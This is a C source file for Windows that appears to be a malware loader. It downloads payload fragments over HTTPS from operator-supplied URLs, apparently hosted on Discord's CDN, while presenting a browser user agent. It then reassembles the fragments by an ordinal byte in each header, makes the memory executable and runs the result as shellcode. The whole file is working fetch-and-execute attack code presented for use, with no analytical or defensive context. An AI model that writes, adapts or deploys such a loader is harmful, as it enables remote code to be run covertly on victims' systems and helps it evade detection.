#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

void debugprint(LPCWSTR format, ...) {
    WCHAR buffer[1024];
    va_list arg;
    va_start(arg, format);
    wvsprintfW(buffer, format, arg);
    va_end(arg);
    OutputDebugStringW(buffer);
}

int find_ordinal(BYTE* pHeader) {
    CHAR ordinal_char = (char)pHeader[11];
    int ordinal = ordinal_char - '0';
    return ordinal;
}

int main() {
    WCHAR urls[10][512] = {
       //here you will write the links eg: L"https://fraction01.bin"
    };

    HINTERNET session = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (!session) {
        debugprint(L"session is failed error: %lu\n", GetLastError());
        return 1;
    }

    // Store each payload with its ordinal
    struct PayloadChunk {
        int ordinal;
        BYTE* data;
        SIZE_T size;
    };
    
    PayloadChunk chunks[10] = {0};
    int chunk_count = 0;
    SIZE_T total_final_size = 0;

    for (int i = 0; i < 10; i++) {
        const wchar_t* url = urls[i];
        debugprint(L"urls %ls\n", url);

        URL_COMPONENTS urlcomp = {0};
        urlcomp.dwStructSize = sizeof(urlcomp);
        WCHAR hostname[256] = {0};
        urlcomp.lpszHostName = hostname;
        urlcomp.dwHostNameLength = sizeof(hostname) / sizeof(WCHAR);

        if (!WinHttpCrackUrl(url, wcslen(url), 0, &urlcomp)) {
            debugprint(L"unable to crack the url %lu\n", GetLastError());
            continue;
        }

        HINTERNET connect = WinHttpConnect(session, hostname, urlcomp.nPort, 0);
        if (!connect) {
            debugprint(L"connect is failed error: %lu\n", GetLastError());
            continue;
        }

        HINTERNET open_request = WinHttpOpenRequest(
            connect,
            L"GET",
            urls[i] + wcslen(L"https://cdn.discordapp.com"),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE
        );

        if (!open_request) {
            debugprint(L"failed to open request error: %lu\n", GetLastError());
            WinHttpCloseHandle(connect);
            continue;
        }

        BOOL send_request = WinHttpSendRequest(
            open_request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        );

        if (!send_request) {
            debugprint(L"failed to send request error: %lu\n", GetLastError());
            WinHttpCloseHandle(open_request);
            WinHttpCloseHandle(connect);
            continue;
        }

        BOOL receive_response = WinHttpReceiveResponse(open_request, NULL);
        if (!receive_response) {
            debugprint(L"could not receive the response %lu\n", GetLastError());
            WinHttpCloseHandle(open_request);
            WinHttpCloseHandle(connect);
            continue;
        }

        DWORD dwsize = 0;
        BYTE* pDownload = NULL;
        SIZE_T total_size = 0;
        SIZE_T buffer_size = 4096;
        
        pDownload = (BYTE*)VirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pDownload) {
            debugprint(L"failed to allocate pDownload error: %lu\n", GetLastError());
            WinHttpCloseHandle(open_request);
            WinHttpCloseHandle(connect);
            continue;
        }

        do {
            dwsize = 0;
            if (!WinHttpQueryDataAvailable(open_request, &dwsize)) {
                debugprint(L"failed WinHttpQueryDataAvailable error: %lu\n", GetLastError());
                break;
            }

            if (dwsize == 0) break;

            if (dwsize + total_size > buffer_size) {
                SIZE_T new_buffer_size = buffer_size;
                while (dwsize + total_size > new_buffer_size) {
                    new_buffer_size *= 2;
                }

                BYTE* pNew_download = (BYTE*)VirtualAlloc(NULL, new_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!pNew_download) {
                    debugprint(L"unable to allocate memory for new_download error: %lu\n", GetLastError());
                    break;
                }

                CopyMemory(pNew_download, pDownload, total_size);
                VirtualFree(pDownload, 0, MEM_RELEASE);
                pDownload = pNew_download;
                buffer_size = new_buffer_size;
            }

            DWORD dw_download = 0;
            if (!WinHttpReadData(open_request, pDownload + total_size, dwsize, &dw_download)) {
                debugprint(L"failed to read the bytes error: %lu\n", GetLastError());
                break;
            }

            total_size += dw_download;
        } while (dwsize > 0);

        debugprint(L"total downloaded size %d\n", total_size);

        if (total_size >= 32) {
            // Extract ordinal from header
            int ordinal = find_ordinal(pDownload);
            debugprint(L"ordinal %d\n", ordinal);

            // Extract payload (everything after 32 bytes)
            SIZE_T payload_size = total_size - 32;
            BYTE* payload_data = pDownload + 32;

            debugprint(L"payload size %d\n", payload_size);

            // Store this chunk
            if (chunk_count < 10) {
                chunks[chunk_count].ordinal = ordinal;
                chunks[chunk_count].size = payload_size;
                
                // Allocate memory and copy payload
                chunks[chunk_count].data = (BYTE*)VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (chunks[chunk_count].data) {
                    CopyMemory(chunks[chunk_count].data, payload_data, payload_size);
                    total_final_size += payload_size;
                    chunk_count++;
                }
            }
        }

        VirtualFree(pDownload, 0, MEM_RELEASE);
        WinHttpCloseHandle(open_request);
        WinHttpCloseHandle(connect);
    }

    // Now assemble the final payload in correct order
    BYTE* final_payload = NULL;
    SIZE_T current_offset = 0;
    DWORD old_protect = 0;
    
    if (total_final_size > 0) {
        final_payload = (BYTE*)VirtualAlloc(NULL, total_final_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (final_payload) {
            current_offset = 0;
            
            // Copy chunks in ordinal order (0, 1, 2, 3, ...)
            for (int ord = 0; ord < 10; ord++) {
                for (int i = 0; i < chunk_count; i++) {
                    if (chunks[i].ordinal == ord) {
                        CopyMemory(final_payload + current_offset, chunks[i].data, chunks[i].size);
                        current_offset += chunks[i].size;
                        debugprint(L"Added chunk ordinal %d, size %d at offset %d\n", ord, chunks[i].size, current_offset - chunks[i].size);
                        break;
                    }
                }
            }

            debugprint(L"Final assembled payload size: %d bytes\n", current_offset);

            // Change memory protection to executable
            if (!VirtualProtect(final_payload, current_offset, PAGE_EXECUTE_READ, &old_protect)) {
                debugprint(L"[-] VirtualProtect failed! Error: %lu\n", GetLastError());
                VirtualFree(final_payload, 0, MEM_RELEASE);
                final_payload = NULL;
            } else {
                // Execute the shellcode
                typedef void (*ShellcodeFunc)();
                ShellcodeFunc func = (ShellcodeFunc)final_payload;
                func();
                
                VirtualFree(final_payload, 0, MEM_RELEASE);
            }
        }
    }

    // Cleanup chunk memory
    for (int i = 0; i < chunk_count; i++) {
        if (chunks[i].data) {
            VirtualFree(chunks[i].data, 0, MEM_RELEASE);
        }
    }

    WinHttpCloseHandle(session);
    return 0;
}